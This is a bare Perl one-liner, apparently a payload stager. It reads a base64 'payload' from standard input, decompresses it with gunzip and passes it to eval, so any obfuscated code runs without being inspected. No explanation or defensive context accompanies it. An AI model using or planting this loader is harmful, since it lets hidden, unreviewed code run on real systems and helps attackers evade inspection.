perl -e 'use MIME::Base64; use IO::Uncompress::Gunzip qw(gunzip); print "Base64 Payload: "; $p = <STDIN>; chomp $p; $c = decode_base64($p); gunzip \$c => \$d; eval($d);'
